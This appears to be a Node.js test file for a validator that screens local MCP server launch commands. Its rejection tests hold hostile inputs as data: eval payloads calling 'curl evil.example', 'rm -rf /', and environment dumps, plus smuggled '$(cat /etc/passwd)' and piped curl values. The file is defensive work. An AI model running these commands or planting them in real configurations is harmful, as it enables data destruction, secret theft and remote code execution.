import { validateCustomMcpStdioCommand } from '@open-cowork/runtime-host/mcp-stdio-policy'
import test from 'node:test'
import assert from 'node:assert/strict'
import { mkdtempSync, writeFileSync, rmSync, mkdirSync, symlinkSync } from 'fs'
import { tmpdir } from 'os'
import { join } from 'path'
test('allows common bare runtime commands for local MCPs', () => {
  assert.doesNotThrow(() => validateCustomMcpStdioCommand({
    name: 'filesystem',
    scope: 'machine',
    directory: null,
    command: 'node',
  }))
})

test('package runners require version-pinned package specs (JOE-827)', () => {
  assert.throws(() => validateCustomMcpStdioCommand({
    name: 'floating',
    scope: 'machine',
    directory: null,
    command: 'npx',
    args: ['-y', 'some-mcp'],
  }), /unpinned package/)
  assert.throws(() => validateCustomMcpStdioCommand({
    name: 'latest',
    scope: 'machine',
    directory: null,
    command: 'npx',
    args: ['-y', 'some-mcp@latest'],
  }), /unpinned package/)
  assert.doesNotThrow(() => validateCustomMcpStdioCommand({
    name: 'pinned',
    scope: 'machine',
    directory: null,
    command: 'npx',
    args: ['-y', 'some-mcp@1.2.3'],
  }))
  assert.doesNotThrow(() => validateCustomMcpStdioCommand({
    name: 'scoped-pinned',
    scope: 'machine',
    directory: null,
    command: 'npx',
    args: ['-y', '@modelcontextprotocol/server-filesystem@0.6.2'],
  }))
  assert.doesNotThrow(() => validateCustomMcpStdioCommand({
    name: 'uvx-pinned',
    scope: 'machine',
    directory: null,
    command: 'uvx',
    args: ['mcp-server-fetch==0.1.0'],
  }))
})

test('rejects unknown bare commands for local MCPs', () => {
  // A non-shell, non-allowlisted command. `sh` hits the explicit
  // shell rejection with a different error message, so we use a
  // made-up runtime here to exercise the fallback allowlist path.
  assert.throws(() => validateCustomMcpStdioCommand({
    name: 'unsafe',
    scope: 'machine',
    directory: null,
    command: 'my-homegrown-runtime',
  }), /not an allowed bare command/)
})

test('rejects container runtimes as bare commands for local MCPs', () => {
  for (const command of ['docker', 'podman']) {
    assert.throws(() => validateCustomMcpStdioCommand({
      name: `${command}-mcp`,
      scope: 'machine',
      directory: null,
      command,
    }), /not an allowed bare command/)
  }
})

test('allows project-relative executables that stay inside the project', () => {
  const root = mkdtempSync(join(tmpdir(), 'open-cowork-mcp-'))
  const scriptPath = join(root, 'bin', 'server.js')

  try {
    mkdirSync(join(root, 'bin'), { recursive: true })
    writeFileSync(scriptPath, 'process.stdout.write("ok")', { flag: 'w' })
    assert.doesNotThrow(() => validateCustomMcpStdioCommand({
      name: 'local-project',
      scope: 'project',
      directory: root,
      command: './bin/server.js',
    }))
  } finally {
    rmSync(root, { recursive: true, force: true })
  }
})

test('rejects project-relative executables that escape the project root', () => {
  const root = mkdtempSync(join(tmpdir(), 'open-cowork-mcp-'))
  const outside = mkdtempSync(join(tmpdir(), 'open-cowork-mcp-outside-'))
  const scriptPath = join(outside, 'server.js')

  try {
    writeFileSync(scriptPath, 'process.stdout.write("ok")', { flag: 'w' })
    assert.throws(() => validateCustomMcpStdioCommand({
      name: 'escaped-project',
      scope: 'project',
      directory: root,
      command: '../server.js',
    }), /must stay inside the selected project/)
  } finally {
    rmSync(root, { recursive: true, force: true })
    rmSync(outside, { recursive: true, force: true })
  }
})

test('rejects project-relative executables that escape via a shared-prefix sibling path', () => {
  const parent = mkdtempSync(join(tmpdir(), 'open-cowork-mcp-prefix-parent-'))
  const root = join(parent, 'project')
  const sibling = join(parent, 'project-evil')
  const scriptPath = join(sibling, 'bin', 'server.js')

  try {
    mkdirSync(join(root, 'bin'), { recursive: true })
    mkdirSync(join(sibling, 'bin'), { recursive: true })
    writeFileSync(scriptPath, 'process.stdout.write("ok")', { flag: 'w' })
    assert.throws(() => validateCustomMcpStdioCommand({
      name: 'escaped-prefix-project',
      scope: 'project',
      directory: root,
      command: '../project-evil/bin/server.js',
    }), /must stay inside the selected project/)
  } finally {
    rmSync(parent, { recursive: true, force: true })
  }
})

test('rejects project-relative executables that escape through a symlink inside the project', () => {
  const parent = mkdtempSync(join(tmpdir(), 'open-cowork-mcp-symlink-parent-'))
  const root = join(parent, 'project')
  const outside = join(parent, 'outside')
  const scriptPath = join(outside, 'server.js')
  const linkedPath = join(root, 'bin', 'linked-server.js')

  try {
    mkdirSync(join(root, 'bin'), { recursive: true })
    mkdirSync(outside, { recursive: true })
    writeFileSync(scriptPath, 'process.stdout.write("ok")', { flag: 'w' })
    symlinkSync(scriptPath, linkedPath)

    assert.throws(() => validateCustomMcpStdioCommand({
      name: 'escaped-symlink-project',
      scope: 'project',
      directory: root,
      command: './bin/linked-server.js',
    }), /must stay inside the selected project/)
  } finally {
    rmSync(parent, { recursive: true, force: true })
  }
})

test('rejects shell binaries even when passed as an absolute path', () => {
  assert.throws(() => validateCustomMcpStdioCommand({
    name: 'shell-bomb',
    scope: 'machine',
    directory: null,
    command: '/bin/bash',
  }), /shell/i)
  assert.throws(() => validateCustomMcpStdioCommand({
    name: 'zsh-bomb',
    scope: 'machine',
    directory: null,
    command: 'zsh',
  }), /shell/i)
})

test('rejects script-eval flags that would turn an allowed runtime into an RCE', () => {
  assert.throws(() => validateCustomMcpStdioCommand({
    name: 'node-eval',
    scope: 'machine',
    directory: null,
    command: 'node',
    args: ['-e', 'require("child_process").exec("curl evil.example")'],
  }), /evaluates inline code/)
  assert.throws(() => validateCustomMcpStdioCommand({
    name: 'python-eval',
    scope: 'machine',
    directory: null,
    command: 'python3',
    args: ['-c', 'import os; os.system("rm -rf /")'],
  }), /evaluates inline code/)
  assert.throws(() => validateCustomMcpStdioCommand({
    name: 'deno-eval',
    scope: 'machine',
    directory: null,
    command: 'deno',
    args: ['--eval', 'Deno.exit()'],
  }), /evaluates inline code/)
  assert.throws(() => validateCustomMcpStdioCommand({
    name: 'node-eval-attached',
    scope: 'machine',
    directory: null,
    command: 'node',
    args: ['--eval=process.exit(0)'],
  }), /evaluates inline code/)
  assert.throws(() => validateCustomMcpStdioCommand({
    name: 'python-eval-attached',
    scope: 'machine',
    directory: null,
    command: 'python3',
    args: ['-cprint("owned")'],
  }), /evaluates inline code/)
  assert.throws(() => validateCustomMcpStdioCommand({
    name: 'ruby-eval-attached',
    scope: 'machine',
    directory: null,
    command: 'ruby',
    args: ['-eputs ENV.inspect'],
  }), /evaluates inline code/)
})

test('rejects shell metacharacters smuggled into command or args', () => {
  assert.throws(() => validateCustomMcpStdioCommand({
    name: 'pipe-command',
    scope: 'machine',
    directory: null,
    command: 'node | curl evil',
  }), /shell metacharacters/)
  assert.throws(() => validateCustomMcpStdioCommand({
    name: 'backtick-arg',
    scope: 'machine',
    directory: null,
    command: 'node',
    args: ['server.js', '`whoami`'],
  }), /shell metacharacters/)
  assert.throws(() => validateCustomMcpStdioCommand({
    name: 'subst-arg',
    scope: 'machine',
    directory: null,
    command: 'node',
    args: ['$(cat /etc/passwd)'],
  }), /shell metacharacters/)
})

test('allows legitimate MCP invocations with flags that are not evals', () => {
  assert.doesNotThrow(() => validateCustomMcpStdioCommand({
    name: 'github-mcp',
    scope: 'machine',
    directory: null,
    command: 'npx',
    args: ['-y', '@modelcontextprotocol/server-github@0.6.2'],
  }))
  assert.doesNotThrow(() => validateCustomMcpStdioCommand({
    name: 'local-script',
    scope: 'machine',
    directory: null,
    command: 'node',
    args: ['./server.js', '--port=3000'],
  }))
})
